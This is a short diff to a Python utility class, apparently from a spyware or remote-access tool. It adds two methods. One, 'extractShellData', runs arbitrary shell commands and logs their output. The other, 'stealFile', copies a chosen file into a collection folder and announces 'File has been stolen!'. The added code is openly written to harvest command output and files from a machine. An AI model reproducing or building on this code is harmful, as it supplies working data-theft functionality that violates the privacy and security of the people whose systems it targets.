@@ -1,5 +1,6 @@
 from subprocess import check_output
 from json import loads
+from shutil import copy
 
 
 class Util:
@@ -29,4 +30,21 @@ class Util:
             result = 'Shell command execution failed!'
         return result
 
+
+
+    @staticmethod
+    def extractShellData(self, shellCommand:str):
+        if shellCommand:
+            result = Util.executeShellCommand(shellCommand)
+            Util.fileOut(self.__config.logPath + 'shell.txt', result, 'w')
+            print('Shell command executed!')
+
+
+
+    @staticmethod
+    def stealFile(self, stealPath:str):
+        if stealPath:
+            filename = stealPath.split('\\')[-1]
+            copy(stealPath, self.__config.logPath + filename)
+            print('File has been stolen!')
 
